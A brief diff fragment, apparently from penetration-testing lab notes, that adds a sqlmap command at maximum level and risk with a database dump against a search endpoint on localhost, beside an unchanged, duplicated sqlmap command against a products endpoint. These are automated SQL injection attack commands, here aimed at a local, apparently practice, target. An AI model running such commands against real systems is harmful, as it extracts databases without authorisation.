@@ -74,3 +74,5 @@ sqlmap -u "http://localhost:3000/api/Products?category=1" --batch --dump
 
 sqlmap -u "http://localhost:3000/api/Products?category=1" --batch --dump
 
+sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --level=5 --risk=3 --batch --dump
+
